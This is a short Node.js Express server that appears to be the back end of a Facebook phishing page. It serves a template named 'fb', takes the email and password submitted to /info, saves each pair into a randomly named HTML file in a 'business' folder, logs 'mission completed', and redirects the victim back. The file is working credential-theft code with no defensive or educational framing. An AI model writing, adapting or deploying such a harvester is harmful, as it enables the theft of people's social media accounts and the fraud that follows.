var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var fs = require("fs");
const PORT = process.env.PORT || 5000

app.set("view engine" , "ejs");
app.use(bodyParser.urlencoded({ extended: true}));



app.get("/" , function(req ,res){
  res.render("fb");

});

app.post("/info" , function(req , res){
  var info = `
  <p>Facebook info</p>
  <ul>

  <li>email:${req.body.email}</li>
  <li>password:${req.body.pass}</li>




  </ul>

  `;



    function makename() {
      var text = "";
      var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

      for (var i = 0; i < 5; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

      return text;
    }

    var randoom = makename();



      fs.writeFile('./business/'+ randoom +'.html', info, (err) => {
          // throws an error, you could also catch it here
          if (err) throw err;

          // success case, the file was saved
          console.log('mission completed');
      });







  res.redirect("/");
})



app.listen(PORT, () => console.log(`Listening on ${ PORT }`));
